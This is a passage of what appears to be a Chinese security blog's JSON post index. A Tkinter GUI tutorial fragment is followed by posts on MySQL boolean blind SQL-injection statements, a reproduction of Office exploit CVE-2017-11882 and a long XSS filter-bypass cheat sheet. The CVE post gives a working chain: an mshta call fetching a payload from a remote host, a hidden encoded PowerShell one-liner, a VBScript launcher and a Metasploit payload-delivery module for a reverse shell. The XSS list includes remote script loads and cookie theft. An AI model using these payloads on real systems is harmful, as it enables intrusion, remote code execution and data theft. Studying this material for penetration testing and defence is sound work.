var1, # 将后面的 1 或者 0 放入 var1 中onvalue = 1, # 将 1 传递给 var1offvalue = 0, # 将 0 传递给 var2command = select # 执行函数)checkbutton2 = Tkinter.Checkbutton(window,text = &apos;C++&apos;,variable = var2,onvalue = 1,offvalue = 0,command = select)checkbutton1.pack()checkbutton2.pack() Canvas 画布1234567891011121314canvas = Tkinter.Canvas(window,bg=&apos;#00FFFF&apos;,width=300,height=300)canvas.pack()image_file = Tkinter.PhotoImage(file=&apos;ins.gif&apos;) # 创造一个变量存放 ins.gifimage = canvas.create_image(10,10,anchor=&apos;nw&apos;,image=image_file) # 10,10是放置的坐标，abchor=nw则是把图片的左上角作为锚定点，在加上刚刚给的坐标位置，即可将图片位置确定x0, y0, x1, y1= 50, 50, 80, 80line = canvas.create_line(x0, y0, x1, y1) # 画直线oval = canvas.create_oval(x0, y0, x1, y1, fill=&apos;red&apos;) # 创建一个圆，填充色为`red`红色arc = canvas.create_arc(x0+30, y0+30, x1+30, y1+30, start=0, extent=180)# 创建一个扇形，start=0和extent=180，其实就是从0度到180度rect = canvas.create_rectangle(100, 30, 100+20, 30+20) #创建一个矩形 Menu 菜单1234# 单一标签menubar = Tkinter.Menu(window)menubar.add_command(label=&apos;quit&apos;,command=quit)window.config(menu=menubar) 1234567891011# 分级标签menubar = Tkinter.Menu(window)filemenu = Tkinter.Menu(menubar,tearoff=0)filemenu.add_command(label=&apos;quit&apos;,command=quit)filemenu.add_command(label=&apos;quit_again&apos;,command=quit)filemenu.add_separator()filemenu.add_command(label=&apos;last_again&apos;,command=quit)menubar.add_cascade(label=&apos;QUIT&apos;,menu=filemenu)window.config(menu=menubar) Frame 窗口12345678910111213Tkinter.Label(window,text=&apos;on the window&apos;).pack() # 定义一个label显示 on the windowfrm = Tkinter.Frame(window) # 在 window 上创建一个面板 frmfrm.pack()frm_l = Tkinter.Frame(frm) # 在frm上再创建 2 个面板frm_r = Tkinter.Frame(frm)frm_l.pack(side=&apos;left&apos;)frm_r.pack(side=&apos;right&apos;)Tkinter.Label(frm,text=&apos;this is frm&apos;).pack()Tkinter.Label(frm_l,text=&apos;this is frm_l&apos;).pack()Tkinter.Label(frm_r,text=&apos;this is frm_r&apos;).pack() tkMessageBox 弹窗123456789import tkMessageBoxdef hit_me(): tkMessageBox.showinfo(title=&apos;HELLO&apos;, message=&apos;hahaha&apos;) # 提示信息对话框 tkMessageBox.showwarning(title=&apos;ERROR&apos;, message=&apos;Dont do this&apos;) # 提出警告对话窗 tkMessageBox.showerror(title=&apos;emmm&apos;, message=&apos;error&apos;) # 提出错误对话窗 tkMessageBox.askquestion(title=&apos;What?&apos;, message=&apos;Chooise one&apos;) # 询问选择对话窗，返回 yes 和 no Tkinter.Button(window,text=&apos;hit_me&apos;,command=hit_me).pack() 排版方式 layoutpack()按照上下左右的方式排列 1234Tkinter.Label(window,text=&apos;left&apos;).pack(side=&apos;left&apos;)Tkinter.Label(window,text=&apos;right&apos;).pack(side=&apos;right&apos;)Tkinter.Label(window,text=&apos;top&apos;).pack(side=&apos;top&apos;)Tkinter.Label(window,text=&apos;bottom&apos;).pack(side=&apos;bottom&apos;) gridgrid 是方格, 所以所有的内容会被放在这些规律的方格中. 123456# row 表示行，column表示列，padx表示左右间距，pady表示上下间距Tkinter.Label(window,text=&apos;1&apos;).grid(row=1,column=1,padx=10, pady=10)Tkinter.Label(window,text=&apos;2&apos;).grid(row=2,column=2,padx=10, pady=10)Tkinter.Label(window,text=&apos;3&apos;).grid(row=3,column=3,padx=10, pady=10)Tkinter.Label(window,text=&apos;4&apos;).grid(row=4,column=4,padx=10, pady=10)Tkinter.Button(window,text=&apos;hit me&apos;,command=quit).grid(row=5,column=5,padx=10,pady=10) place就是给精确的坐标来定位 123# x坐标，y坐标，anchor=&apos;nw&apos; ==&gt; north west 西北角开始Tkinter.Label(window,text=&apos;1&apos;).place(x=200,y=100,anchor=&apos;nw&apos;)Tkinter.Button(window,text=&apos;hit me&apos;,command=quit).place(x=500,y=300,anchor=&apos;nw&apos;)","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"MySQL基于布尔型盲注常用语句","slug":"MySQL基于布尔型盲注常用语句","date":"2017-11-26T02:28:02.000Z","updated":"2018-06-10T03:51:21.180Z","comments":true,"path":"2017/11/26/MySQL基于布尔型盲注常用语句/","link":"","permalink":"https://damit5.com/2017/11/26/MySQL基于布尔型盲注常用语句/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer5\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 什么是盲注？基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回True（页面）和False（页面）。这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。","text":"new APlayer({ element: document.getElementById(\"aplayer5\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 什么是盲注？基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回True（页面）和False（页面）。这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。 常用语句汇总 查询所有数据库1.判断表存不存在1and exists(select * from information_schema.tables) 2.判断存在多少个库1and (select count(distinct+table_schema) from information_schema.tables)&gt;4 3.判断库名的长度1and (select length(table_schema) from information_schema.tables limit 0,1) &gt;17 4.接下来爆每个库的库名1and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1),1,1)))&gt;104 5.猜表，首先判断表的长度1and (select length(table_name) from information_schema.tables where table_schema=&apos;information_schema&apos; limit 0,1) &gt;13 6.判断完表的长度之后就要开始猜解表的字符1and (select ascii(substr((select table_name from information_schema.tables where table_schema=&apos;information_schema&apos; limit 0,1),1,1))) &gt;66 7.再接下来猜解表里边的字段即列,首先统计一下有多少个字段1and (select count(column_name) from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; ) &gt;4 8.判断每个字段的长度1and (select length(column_name) from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; limit 0,1 ) &gt;17 9.接下来猜第一个字段的字符1and (select ascii(substr((select column_name from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; limit 0,1),1,1)) ) &gt;66 查询当前数据库1.查询数据库的长度1and length(database()) &gt; 4 2.查询数据库名1and ascii(substr((select database()),1,1)) &gt; 99 3.查询表名的长度1and (select(length(table_name)) from information_schema.tables where table_schema = 0x64767761 limit 0,1) &gt; 8+--+ 4.查询表名1and ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 1,1),1,1)) &gt; 116 5.查询列名的长度1and (select(length(column_name)) from information_schema.columns where table_name = 0x7573657273 limit 0,1) &gt; 6 6.查询列名1and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)) &gt; 116 7.查询字段的长度1and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 1,1 ) &gt;10 8.爆出字段1and ascii(substr((select user from dvwa.users limit 0,1),1,1)) &gt; 96","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现","slug":"Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现","date":"2017-11-22T03:08:28.000Z","updated":"2018-06-10T03:47:35.131Z","comments":true,"path":"2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/","link":"","permalink":"https://damit5.com/2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer3\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00背景2017年11月，微软在例行系统补丁发布中，修复了一个Office远程代码执行的严重漏洞，编号CVE-2017-11882。该漏洞类型为缓冲区溢出，位为EQNEDT32.EXE组件。受害用户打开恶意的office文档时，无需交互，就可能执行恶意代码。 据悉，这个组件是由Design Science Inc.开发的，后来由微软收购。该组件于2001年编译嵌入office，之后没有任何进一步的修改。所以该漏洞已存在17年之久。影响现阶段流行的所有office版本。","text":"new APlayer({ element: document.getElementById(\"aplayer3\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00背景2017年11月，微软在例行系统补丁发布中，修复了一个Office远程代码执行的严重漏洞，编号CVE-2017-11882。该漏洞类型为缓冲区溢出，位为EQNEDT32.EXE组件。受害用户打开恶意的office文档时，无需交互，就可能执行恶意代码。 据悉，这个组件是由Design Science Inc.开发的，后来由微软收购。该组件于2001年编译嵌入office，之后没有任何进一步的修改。所以该漏洞已存在17年之久。影响现阶段流行的所有office版本。 0x01 漏洞概述EQNEDT32.EXE是用于在文档中插入和编辑方程式。插入到文档中的任何公式都是OLE对象。该组件是在OLE技术规范下设计的。首发于Microsoft Office 2000和Microsoft 2003。从Microsoft Office 2007套件开始，显示和编辑方程的方法发生了变化，虽然EQNEDT32.EXE变得过时，不过，为了保持版本兼容性，它并没有从Office套件中删除。 EQNEDT32.EXE为OLE实现了一组标准的COM接口。 IOleObject IDataObject IOleInPlaceObject IOleInPlaceActiveObject IpersistStorage 而问题的就在于IpersistStorage：Load这个位置。因为历史久远，该组件开发的时候并没有例如ASLR这样的漏洞缓解措施。利用起来更加的方便。 0x02 漏洞利用1.生成反弹 shell 的一句话生成 shell1mshta.exe &quot;//192.168.9.172:8080/6QYqdXU&quot; 2.访问该 url ，下载文件，获取 powershell 一句话1powershell.exe -nop -w hidden -e ******************* 3.新建文件，例如 abc将 calc.exe 换成上面的 powershell 一句话 123456789101112131415&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject(&quot;Wscript.Shell&quot;)objShell.Run &quot;calc.exe&quot;self.close&lt;/script&gt;&lt;body&gt;demo&lt;/body&gt;&lt;/HEAD&gt; &lt;/HTML&gt; 大概长这样 4.将该文件上传到 /var/www/html/ 目录下，并开启 apache 服务器1service apache2 start 5.利用 exp 生成 doc1python Command_CVE-2017-11882.py -c &quot;mshta //192.168.9.172/abc&quot; -o test.doc 6.开启 msf 监听 7.打开 doc 8.成功获得 shell 0x03 参考文档//bobao.360.cn/learning/detail/4734.html https://github.com/Ridter/CVE-2017-11882 PS_shell.rb 内容12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = &#123;&#125;) super(update_info(info, &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;, &apos;Description&apos; =&gt; %q&#123; This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc. &#125;, &apos;License&apos; =&gt; MSF_LICENSE, &apos;Arch&apos; =&gt; ARCH_X86, &apos;Platform&apos; =&gt; &apos;win&apos;, &apos;Targets&apos; =&gt; [ [&apos;Automatic&apos;, &#123;&#125; ], ], &apos;DefaultTarget&apos; =&gt; 0, )) end def on_request_uri(cli, _request) print_status(&quot;Delivering payload&quot;) p = regenerate_payload(cli) data = Msf::Util::EXE.to_executable_fmt( framework, ARCH_X86, &apos;win&apos;, p.encoded, &apos;hta-psh&apos;, &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125; ) send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;) end def primer url = get_uri print_status(&quot;Place the following DDE in an MS document:&quot;) print_line(&quot;mshta.exe \\&quot;#&#123;url&#125;\\&quot;&quot;) endend","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"XSS 绕过常用语句","slug":"XSS-绕过常用语句","date":"2017-10-15T06:29:27.000Z","updated":"2018-06-10T04:00:07.891Z","comments":true,"path":"2017/10/15/XSS-绕过常用语句/","link":"","permalink":"https://damit5.com/2017/10/15/XSS-绕过常用语句/","excerpt":"写在最前面:::下文中 alert 都可以由 prompt 代替","text":"写在最前面:::下文中 alert 都可以由 prompt 代替 最常用的 XSS 漏洞测试代码：1234&lt;script&gt;prompt(&quot;XSS&quot;)&lt;/script&gt;&lt;SCRIPT SRC=http://damit5.ml/xss.js&gt;&lt;/SCRIPT&gt; 在输入(Input)标签里1&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt; 闭合&lt;input&gt;1&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt; 现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。1&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos; 所有的输入就会变成这样：1&lt;INPUT type=&quot;text&quot; value=&apos;&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;&apos;&gt; Javascript 代码就注入了。&lt;xss a=”&gt;这个没什么意义，你可以自己改，但是符合 html 的标准，页面不会出错。 绕过单引号过滤同样的例子，但是我们假设管理员在我们的单引号之前放置了一个“\\”，有时候双引号之前也会放置，通过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样： 1&lt;INPUT type=&quot;text&quot; value=&apos;\\&apos;&gt;&lt;SCRIPT&gt;alert(\\&quot;XSS\\&quot;)&lt;/SCRIPT&gt;&apos;&gt; 有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。 1 2 3 4 &amp;#34; &amp;quot; “ 双引号 &amp;#38; &amp;amp; &amp; &amp;符号 &amp;#60; &amp;lt; &lt; 小于号 &amp;#62; &amp;gt; &gt; 大于号 使用&amp;quot;或者&amp;#34;来代替我们的双引号，有时候可以绕过过滤。 例子:123&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt; 如果这都被过滤了。那我们可以使用 JavaScript 的 fromCharCode 函数，这个函数把指定的 Unicode值转换成字符串。 例子12&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt; 绕过 &lt;SCRIPT&gt;过滤有些过滤器会过滤到&lt;script&gt;标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。1&lt;BODY onload=&quot;alert(&apos;XSS&apos;)&quot;&gt; 在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。 123&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt; 注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用&lt;script&gt;标签哦。 使用 IMG 源Html 中最常用的两个标签 img 和 a href一般是不会过滤的，一个指定图片，一个指定超链接。最危险的是 img 标签 例子：标准的样子：1&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; 没有双引号和分号:1&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt; 不区分大小写的xss攻击向量1&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt; 过滤了双引号和 &lt;script&gt;:1&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt; 使用 CharCode 绕过过滤:1&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:1&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101; &amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; 使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。1&lt;IMG SRC=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp; #x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x58;&amp;#x53;&amp;#x53;&amp;#x27;&amp;#x29;&gt; 默认SRC属性去绕过SRC域名检测过滤器这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于热河一个HTML标签，例如Form、Iframe、Input、Embed等等。他将也允许任何任何该标签的相关事件去替换，例如onblur, onclick等1&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt; 默认SRC属性通过省略它的值1&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt; 默认SRC属性通过完全不设置它1&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt; 结尾没有分号的十六进制html编码引用1&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; 使用制表符, 换行符和回车符使用了最小的十六进制的制表符来欺骗过滤器1&lt;IMG SRC=&quot;jav&amp;#x9ascript:alert(&apos;XSS&apos;);&quot;&gt; Type Horizontal Tab New line Carriage Return URL %09 %10 %13 Minimal Sized Hex &amp;#x9 &amp;#xA &amp;#xD Maximum Sized Hex &amp;#x0000009; &amp;#x000000A; &amp;#x000000D; Minimum Sized Decimal &amp;#9 &amp;#10 &amp;#13 Maximum Sized Decimal &amp;#x0000009; &amp;#x0000009; &amp;#0000009; 使用空字符另一个可以绕过的就是空字符，这是最有效的工具了。。 1&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt; 空字符 (%00) 使得过滤器不能看到完整的 &lt;SCRIPT&gt; 标签. 只在 IE 6.0, IE 7.0 可以。 双引号配对的bug绕过这种过滤就是寻找闭合的标签，然后构造来突破 例子1&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; 通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事实不是这样，所有的浏览器都在试图修正这一问题。结果最终如下:1&lt;img&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&amp;gt; 不全面的过滤器我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令里插入代码。我们通过 base64 加密&lt;script&gt;alert(‘XSS’)&lt;/script&gt;. 12&lt;META HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt; 畸形的A标签跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器1&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt; 此外，chrome浏览器喜欢去不全确实的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你不全缺失的引号在URL和script中。1&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt; 使用双引号如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。1&lt;IMG SRC=`javascript:alert(&quot;Look its, &apos;XSS&apos;&quot;)`&gt; 转义字符转义字符有时候很有用，可以对付一些简单的过滤器1&lt;IMG SRC=`javascript:alert(\\&quot;XSS\\&quot;)`&gt; 结果如下: 1&lt;IMG SRC=`javascript:alert(\\\\&quot;XSS\\\\&quot;)`&gt; 编码使用 utf-7 编码可以绕过例子1&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; 使用UTF-7编码后 1+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4- 然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符 1%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4- 一个列表: 字符 实体引用 空格 %20 / %2F “ %22 ? %3F 我也不知道咋分类了内嵌TAB1&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt; 内嵌被编码的TAB用来分开xss攻击代码1&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt; 内嵌换行符去分开xss代码1&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt; 编码回车符去分开xss代码1&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt; 没有分割的javascript指令null字符也可以作为一个xss向量，但是不像上边那样。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器用过变动像这个例子中的。1perl -e &apos;print &quot;&lt;IMG SRC=java\\0script:alert(\\&quot;XSS\\&quot;)&gt;&quot;;&apos; &gt; out 图片元素中javascript之前的空格和元字符为xssxss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。1&lt;IMG SRC=&quot; &amp;#14; javascript:alert(&apos;XSS&apos;);&quot;&gt; 非字母数字字符xssFirefox html解析器设定一个非数字字母字符不是有效的在一个html关键字后面，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。 例如1&lt;SCRIPT/XSS SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt; 和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。从而借此绕过xss过滤器。注意这也是适用于重音符如下所示：1&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(&quot;XSS&quot;)&gt; Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是他们仅允许一个一个斜杠在html标签和参数之间，在不使用空格的情况下。这可能是有用的在那些不允许输入空格的系统中。1&lt;SCRIPT/SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt; 附加的开括号Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。代码中的双斜杠可以抑制额外尖括号导致的javascript错误。1&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt; 没关闭的script标签对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;“这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。1&lt;SCRIPT SRC=http://damit5.ml/xss.js?&lt; B &gt; script标签中的协议解析这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。1&lt;SCRIPT SRC=//ha.ckers.org/.j&gt; 半开的HTML/JavaScript xss向量不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指定在图片标签中这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以插入这个xss向量在任何html标签后面。甚至没有用”&gt;”关闭标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\\%3D)|(=))[^\\n]*((\\%3C)|&lt;)[^\\n]+((\\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 这也是有效的去对付真实的xss过滤器，我曾经碰见过试用半开的1&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot; 双开尖括号使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。1&lt;iframe src=http://damit5.ml/xss.html &lt; 转义javascript中的转义当一个应用程序是输出用户自定义的信息到javascript代码中，例如：&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过转义被转义的字符来绕过它。从而使最终的输入代码类似于&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt; 。最终\\转义了双引号前被服务器添加的\\，而双引号则不会被转义，从而触发xss向量。xss定位器使用这个方法。1\\&quot;;alert(&apos;XSS&apos;);// 闭合title标签这是一个简单的xss向量，可以引入一个恶意的xss攻击。1&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt; INPUT image1&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; BODY image1&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; IMG DYNSRC(视频剪辑)1&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; IMG lowsrc（低分辨率图片）1&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; List-style-image1&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt; List-style-image为带有符号的列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为javascript指令。这不是一个特别有用的xss向量。1&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt; VBscript in an image1&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt; Livescript (仅适用于老版本的Netscape)1&lt;IMG SRC=&quot;livescript:[code]&quot;&gt; BGSOUND(背景音乐)1&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; &amp; JavaScript 包含1&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt; 样式表1&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; new APlayer({ element: document.getElementById(\"aplayer12\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"Windows MySQL 